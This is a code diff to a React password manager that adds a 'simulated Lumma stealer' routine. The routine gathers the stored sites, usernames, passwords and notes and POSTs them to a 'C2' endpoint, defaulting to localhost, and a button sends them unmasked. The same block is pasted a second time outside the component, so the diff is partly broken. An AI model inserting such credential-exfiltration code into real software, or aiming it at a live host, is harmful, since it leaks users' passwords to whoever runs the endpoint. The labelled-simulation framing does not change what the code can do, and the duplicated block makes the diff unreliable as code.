@@ -268,6 +268,74 @@ export default function PasswordManager() {
       </div>
     );
   }
+// --- Simulate Lumma-like collection & exfiltration (safe) ---
+// Build a "simulated" exfil payload from the app's state (passwords).
+// IMPORTANT: this function never reads browser secrets outside your app state.
+// It masks values by default so no real credential values are leaked.
+const buildSimulatedLummaPayload = (passwordsArray, options = { mask: true }) => {
+  // passwordsArray should be your in-memory `passwords` state from React
+  const payload = {
+    simulation: true,
+    attacker_label: 'simulated-lumma-demo',
+    timestamp: new Date().toISOString(),
+    victim_id: 'demo-victim-1', // changeable for experiments
+    collected: passwordsArray.map((p) => {
+      const maskedPassword = options.mask
+        ? maskString(p.password, 4) // show last 4 chars only
+        : p.password; // ONLY use unmasked in fully controlled lab with dummy data
+      return {
+        site: p.website,
+        username: p.username,
+        password: maskedPassword,
+        notes: p.notes || '',
+        createdAt: p.createdAt,
+        updatedAt: p.updatedAt
+      };
+    })
+  };
+  return payload;
+};
+
+// Utility to mask a string but keep last N characters readable for demo
+const maskString = (s, last = 4) => {
+  if (!s) return '';
+  if (s.length <= last) return '*'.repeat(s.length);
+  const maskedPart = '*'.repeat(Math.max(0, s.length - last));
+  return maskedPart + s.slice(-last);
+};
+
+// Perform a simulated "Lumma exfil" to your local simulated C2 server.
+// c2Url should be http(s)://localhost:PORT/c2/upload or internal test host.
+const simulateLummaExfil = async (c2Url = 'http://localhost:4000/c2/upload', options = { mask: true }) => {
+  // Confirm operator wants to perform the simulation
+  const ok = window.confirm(
+    'Run simulated Lumma exfiltration to a local, safe C2 (localhost). This will NOT send real credentials outside this host. Continue?'
+  );
+  if (!ok) return { ok: false, reason: 'user_cancelled' };
+
+  // Build payload using only app state (passwords)
+  const payload = buildSimulatedLummaPayload(passwords, options);
+
+  try {
+    const res = await fetch(c2Url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) {
+      const text = await res.text();
+      console.error('C2 rejected simulation:', text);
+      return { ok: false, reason: 'c2_error', detail: text };
+    }
+    const json = await res.json();
+    alert('Simulation sent to simulated C2 (check server dashboard).');
+    return { ok: true, response: json };
+  } catch (err) {
+    console.error('Simulation failed', err);
+    alert('Failed to reach simulated C2 (is the server running on localhost:4000?).');
+    return { ok: false, reason: 'network_error', detail: err.message };
+  }
+};
 
   return (
     <div className="min-h-screen bg-gray-50">
@@ -466,9 +534,88 @@ export default function PasswordManager() {
               </div>
             ))
           )}
+<button onClick={() => simulateLummaExfil('http://localhost:4000/c2/upload', { mask: true })}
+  className="px-3 py-2 bg-red-100 text-red-800 rounded-lg hover:bg-red-200 transition">
+  Simulate Lumma Exfil (masked)
+</button>
+
+<button onClick={() => simulateLummaExfil('http://localhost:4000/c2/upload', { mask: false })}
+  className="px-3 py-2 bg-red-200 text-white rounded-lg hover:bg-red-300 transition">
+  Simulate Lumma Exfil (unmasked — local lab only)
+</button>
+
         </div>
       </main>
     </div>
   );
 }
 
+
+// --- Simulate Lumma-like collection & exfiltration (safe) ---
+// Build a "simulated" exfil payload from the app's state (passwords).
+// IMPORTANT: this function never reads browser secrets outside your app state.
+// It masks values by default so no real credential values are leaked.
+const buildSimulatedLummaPayload = (passwordsArray, options = { mask: true }) => {
+  // passwordsArray should be your in-memory `passwords` state from React
+  const payload = {
+    simulation: true,
+    attacker_label: 'simulated-lumma-demo',
+    timestamp: new Date().toISOString(),
+    victim_id: 'demo-victim-1', // changeable for experiments
+    collected: passwordsArray.map((p) => {
+      const maskedPassword = options.mask
+        ? maskString(p.password, 4) // show last 4 chars only
+        : p.password; // ONLY use unmasked in fully controlled lab with dummy data
+      return {
+        site: p.website,
+        username: p.username,
+        password: maskedPassword,
+        notes: p.notes || '',
+        createdAt: p.createdAt,
+        updatedAt: p.updatedAt
+      };
+    })
+  };
+  return payload;
+};
+
+// Utility to mask a string but keep last N characters readable for demo
+const maskString = (s, last = 4) => {
+  if (!s) return '';
+  if (s.length <= last) return '*'.repeat(s.length);
+  const maskedPart = '*'.repeat(Math.max(0, s.length - last));
+  return maskedPart + s.slice(-last);
+};
+
+// Perform a simulated "Lumma exfil" to your local simulated C2 server.
+// c2Url should be http(s)://localhost:PORT/c2/upload or internal test host.
+const simulateLummaExfil = async (c2Url = 'http://localhost:4000/c2/upload', options = { mask: true }) => {
+  // Confirm operator wants to perform the simulation
+  const ok = window.confirm(
+    'Run simulated Lumma exfiltration to a local, safe C2 (localhost). This will NOT send real credentials outside this host. Continue?'
+  );
+  if (!ok) return { ok: false, reason: 'user_cancelled' };
+
+  // Build payload using only app state (passwords)
+  const payload = buildSimulatedLummaPayload(passwords, options);
+
+  try {
+    const res = await fetch(c2Url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) {
+      const text = await res.text();
+      console.error('C2 rejected simulation:', text);
+      return { ok: false, reason: 'c2_error', detail: text };
+    }
+    const json = await res.json();
+    alert('Simulation sent to simulated C2 (check server dashboard).');
+    return { ok: true, response: json };
+  } catch (err) {
+    console.error('Simulation failed', err);
+    alert('Failed to reach simulated C2 (is the server running on localhost:4000?).');
+    return { ok: false, reason: 'network_error', detail: err.message };
+  }
+};
